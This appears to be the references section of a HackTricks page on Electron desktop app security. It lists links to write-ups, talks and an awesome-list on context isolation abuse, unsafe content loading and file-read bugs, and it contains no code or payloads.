- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
